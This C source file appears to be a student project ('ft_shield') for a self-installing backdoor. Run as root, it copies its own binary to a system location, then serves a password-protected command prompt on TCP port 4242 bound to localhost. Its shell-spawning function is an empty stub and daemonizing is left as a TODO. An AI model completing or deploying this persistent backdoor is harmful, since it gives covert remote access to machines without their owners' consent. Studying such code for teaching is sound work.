#include "ft_shield.h"

void	reset_client(t_client *client)
{
	client->fd = -1;
	client->logged = false;
}

void	remove_client(t_serv *serv, int fd)
{
	close(fd);
	FD_CLR(fd, &serv->fd_master);
	for (int i = 0; i < MAX_CLIENTS; i++)
	{
		if (serv->clients[i].fd == fd)
		{
			reset_client(&serv->clients[i]);
			break ;
		}
	}
	serv->nb_clients--;
}

void	show_help(t_serv *serv, int fd)
{
	char msg[256];
	char *options[NB_CMDS][2] =
	{
		{"help", "print help menu"},
		{"shell", "spawn a shell"},
		{"exit", "logout"}
	};

	bzero(msg, 256);
	for (size_t i = 0; i < NB_CMDS; i++)
	{
		char tmp[256];
		sprintf(tmp, "   %-18s %s\n", options[i][0], options[i][1]);
		strcat(msg, tmp);
	}
	if (send_str(fd, msg) < 0)
		remove_client(serv, fd);
}

void	logout(t_serv *serv, int fd)
{
	for (int i = 0; i < MAX_CLIENTS; i++)
	{
		if (serv->clients[i].fd == fd)
			serv->clients[i].logged = false;
	}
}

void	spawn_shell(t_serv *serv, int fd)
{
	(void)serv;
	(void)fd;
}

void	launch_command(t_serv *serv, int fd, char *cmd)
{
	char *cmds[NB_CMDS] = CMD;
	void (*functions[NB_CMDS])(t_serv *, int) = CMD_FUNC;

	for (int i = 0; i < NB_CMDS; i++)
	{
		if (!strcmp(cmd, cmds[i]))
			return (functions[i](serv, fd));
	}
}

void	backdoor()
{
	t_serv		serv;

	bzero(&serv, sizeof(t_serv));
	serv.port = 4242;
	serv.sockfd = socket(PF_INET, SOCK_STREAM, 0);
	if (serv.sockfd < 0)
		return ;
	serv.addr.sin_family = AF_INET;
	serv.addr.sin_port = htons(serv.port);
	serv.addr.sin_addr.s_addr = htonl(2130706433); //127.0.0.1
	if (bind(serv.sockfd, (struct sockaddr *)&serv.addr, sizeof(serv.addr)) < 0)
		return ;
	listen(serv.sockfd, 100);

	FD_ZERO(&serv.fd_read);
	FD_ZERO(&serv.fd_master);
	FD_SET(serv.sockfd, &serv.fd_master);
	for (int i = 0; i < MAX_CLIENTS; i++)
		reset_client(&serv.clients[i]);
	int fd_max = serv.sockfd;
	while (true)
	{
		serv.fd_read = serv.fd_master;
		select(fd_max + 1, &serv.fd_read, NULL, NULL, NULL);
		int fd = 0;
		while (fd < fd_max + 1)
		{
			if (FD_ISSET(fd, &serv.fd_read))
			{
				struct sockaddr_in		cli;
				socklen_t				len;
				char buffer[BUFFER_SIZE + 1];
				bzero(&buffer, BUFFER_SIZE + 1);
				if (fd == serv.sockfd)
				{
					len = sizeof(cli);
					int new_fd = accept(serv.sockfd, (struct sockaddr *)&cli, &len);
					if (serv.nb_clients < MAX_CLIENTS)
					{
						if (new_fd > fd_max)
							fd_max = new_fd;
						FD_SET(new_fd, &serv.fd_master);
						for (int i = 0; i < MAX_CLIENTS; i++)
						{
							if (serv.clients[i].fd == -1)
							{
								serv.clients[i].fd = new_fd;
								serv.clients[i].logged = false;
							}
						}
						serv.nb_clients++;
						if (send_str(new_fd, "Password: ") < 0)
							remove_client(&serv, new_fd);
					}
					else
						close(new_fd);
				}
				else
				{
					int len_read;
					if ((len_read = recv(fd, buffer, BUFFER_SIZE, 0)) <= 0) // ERROR OR LEAVING
						remove_client(&serv, fd);
					else
					{
						t_client *client = NULL;
						for (int i = 0; i < MAX_CLIENTS; i++)
						{
							if (serv.clients[i].fd == fd)
							{
								client = &serv.clients[i];
								break ;
							}
						}
						if (client)
						{
							char *msg = buffer;
							char *end = memchr(buffer, '\n', len_read);
							if (!end)
								end = buffer + len_read;
							*end = '\0';
							while (msg - buffer < len_read)
							{
								if (!client->logged)
								{
									char *hash = sha512(msg, strlen(msg));
									if (!strcmp(hash, HASHED_PWD))
									{
										if (send_str(fd, "$> ") < 0)
										{
											remove_client(&serv, fd);
											break ;
										}
										client->logged = true;
									}
									else
									{
										if (send_str(fd, "Password: ") < 0)
										{
											remove_client(&serv, fd);
											break ;
										}
									}
									free(hash);
								}
								else if (client->logged)
								{
									launch_command(&serv, fd, msg);
									if (client->logged)
									{
										if (send_str(fd, "$> ") < 0)
										{
											remove_client(&serv, fd);
											break ;
										}
									}
									else
									{
										if (send_str(fd, "Password: ") < 0)
										{
											remove_client(&serv, fd);
											break ;
										}
									}
								}
								msg += strlen(msg) + 1;
								end = memchr(end + 1, '\n', len_read - (end - buffer));
								if (!end)
									end = buffer + len_read;
								*end = '\0';
							}
						}
					}
				}
			}
			fd++;
		}
	}
}

void	duplicate(char *path, char *target)
{
	char *buffer[BUFFER_SIZE];

	int src_fd = open(path, O_RDONLY);
	if (src_fd < 0)
		return ;
	int target_fd = open(target, O_CREAT | O_TRUNC | O_WRONLY, 0100);
	if (target_fd < 0)
	{
		close(src_fd);
		return ;
	}
	int ret;
	while ((ret = read(src_fd, buffer, BUFFER_SIZE)))
		write(target_fd, buffer, ret);
	close(target_fd);
	close(src_fd);
}

int		main(void)
{
	char path[MAX_PATH_SIZE];
	char bin_path[MAX_PATH_SIZE];
	char target_path[MAX_PATH_SIZE];

	if (geteuid())
	{
		printf("You must be root !\n");
		return (EXIT_FAILURE);
	}
	if (readlink(PROC_SELF_EXE, path, MAX_PATH_SIZE) < 0)
		return (EXIT_SUCCESS);
	if (readlink(TARGET_LOCATION, bin_path, MAX_PATH_SIZE) >= 0)
		sprintf(target_path, "/%s/%s", bin_path, PRG_NAME);
	else
		sprintf(target_path, "%s/%s", TARGET_LOCATION, PRG_NAME);
	if (strcmp(path, target_path))
	{
		printf("%s\n", STUDENT_LOGIN);
		duplicate(PROC_SELF_EXE, target_path);
		/* TODO: add as daemon */
	}
	else
		backdoor();
	return (EXIT_SUCCESS);
}
